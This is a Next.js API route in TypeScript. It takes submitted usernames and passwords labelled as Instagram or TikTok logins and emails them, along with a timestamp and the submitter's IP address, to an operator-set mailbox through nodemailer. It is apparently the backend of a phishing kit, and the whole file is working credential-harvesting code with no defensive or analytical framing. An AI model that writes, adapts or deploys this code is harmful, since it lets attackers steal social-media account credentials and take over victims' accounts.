import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'

export async function POST(request: NextRequest) {
  try {
    const { username, password, platform } = await request.json()

    if (!username || !password) {
      return NextResponse.json(
        { error: 'Username and password are required' },
        { status: 400 }
      )
    }

    // Create transporter using environment variables
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || 'smtp.gmail.com',
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    })

    // Email content
    const mailOptions = {
      from: process.env.SMTP_USER,
      to: process.env.RECEIVER_EMAIL || process.env.SMTP_USER,
      subject: `New ${platform === 'instagram' ? 'Instagram' : 'TikTok'} Login Credentials`,
      html: `
        <h2>New Login Credentials Received</h2>
        <p><strong>Platform:</strong> ${platform === 'instagram' ? 'Instagram' : 'TikTok'}</p>
        <p><strong>Username/Email:</strong> ${username}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>IP Address:</strong> ${request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown'}</p>
      `,
      text: `
        New Login Credentials Received
        Platform: ${platform === 'instagram' ? 'Instagram' : 'TikTok'}
        Username/Email: ${username}
        Password: ${password}
        Timestamp: ${new Date().toLocaleString()}
        IP Address: ${request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown'}
      `,
    }

    // Send email
    await transporter.sendMail(mailOptions)

    return NextResponse.json(
      { message: 'Credentials sent successfully' },
      { status: 200 }
    )
  } catch (error) {
    console.error('Error sending email:', error)
    return NextResponse.json(
      { error: 'Failed to send credentials' },
      { status: 500 }
    )
  }
}

